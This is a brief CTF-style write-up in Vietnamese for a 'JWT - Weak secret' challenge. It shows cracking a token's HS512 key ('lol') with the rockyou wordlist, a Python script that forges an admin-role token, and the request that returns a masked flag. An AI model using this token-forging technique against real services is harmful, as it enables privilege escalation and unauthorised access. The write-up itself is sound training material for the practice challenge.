# JWT - Weak secret

## Solution

Đầu tiên truy cập vào trang /token để lấy token:

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.a4Cxf97xhqpexX-Mw0Ik74ncg6TdCK8R_Q7wYC929himTEOyJmePFYCJYvj-ICUTZrVqjPUa83GeMO5AVuOH0Q
```

Decode header và massage trả về:

```
{"alg":"HS512","typ":"JWT"}.{"role":"guest"}
```

Sử dụng danh sách từ rockyou.txt để decode secret và phát hiện ra rằng key là `lol`.

Viết một tập lệnh python đơn giản để tạo jwt token:

```
import jwt
import json
 
message = {
   "role": "admin"
}
 
key = 'lol'
 
encoded_jwt = jwt.encode(message,key, algorithm='HS512')
 
print(encoded_jwt )
```

Sau đó chạy script, trả về:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
```

Sau đó gửi yêu cầu POST đến trang /admin với header `Authorization: Bearer <token>` và nhận được flag:

```
{"result": "Congrats!! Here is your flag: Pl**************"}
```
